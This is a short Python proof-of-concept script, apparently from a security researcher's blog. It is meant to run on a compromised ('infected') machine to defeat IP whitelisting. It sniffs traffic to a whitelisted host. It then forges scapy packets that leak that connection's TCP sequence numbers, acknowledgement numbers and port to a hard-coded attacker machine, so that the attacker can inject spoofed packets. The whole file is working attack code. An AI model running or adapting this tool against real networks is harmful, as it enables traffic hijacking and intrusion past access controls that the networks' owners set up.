#!/usr/bin/env python
"""
    DiabloHorn - https://diablohorn.com
    POC client on 'infected' machines to receive injected packets
    intended to bypass IP whitelisting
"""
import sys
import time
import socket
from threading import Thread
from Queue import Queue, Empty

from scapy.all import *
conf.sniff_promisc = 0
#References
# http://stackoverflow.com/questions/16279661/scapy-fails-to-sniff-packets-when-using-multiple-threads?rq=1

class ControlConnection:
    def __init__(self, host,dport):
        self.host = host
        self.dport = dport
        self.snifferstarted = False

    def setup_cc(self):
        self.q = Queue()
        sniffert = Thread(target = self.__sniffer, args = (self.q,self.host))
        sniffert.daemon = True
        sniffert.start()
        self.snifferstarted = True

    def __sniffer(self, q, targetip,sniface='eth0'):
        sniff(iface=sniface,store=0,prn=lambda x : q.put(x),filter="ip and host {}".format(targetip))

    def connect(self):
        if self.snifferstarted:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.connect((self.host, self.dport))

    def keepalive(self,data='exfil'):
        self.s.sendall(data)

    def leaknum(self):
        pkt = None
        try:
            pkt = self.q.get(timeout=1)
        except Empty:
            pass
        return pkt

    def getdata(self):
        self.s.settimeout(5)
        print self.s.recv(6)
        print self.s.recv(4)

    def close(self):
        self.s.close()

def leaknums(leakednum, leakedport):
    pkt = IP(src="172.16.218.156",dst="172.16.218.152") / TCP(dport=8080,sport=leakedport,seq=leakednum)
    send(pkt)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "{} <whitelisted ip> <port>".format(sys.argv[0])
        sys.exit()

    whitelistedip = sys.argv[1]
    portnum = int(sys.argv[2])

    cc = ControlConnection(whitelistedip,portnum)
    cc.setup_cc()
    time.sleep(2)
    cc.connect()
    while True:
        pkt = cc.leaknum()
        print repr(pkt)
        if pkt:
            tcpdata = pkt.getlayer(TCP)
            #SA flags set
            if tcpdata.flags == 16:
                print 'leaking'
                leaknums(tcpdata.seq,tcpdata.sport)
                leaknums(tcpdata.ack,tcpdata.sport+1)
                try:
                    cc.getdata()
                except:
                    pass
    cc.close()
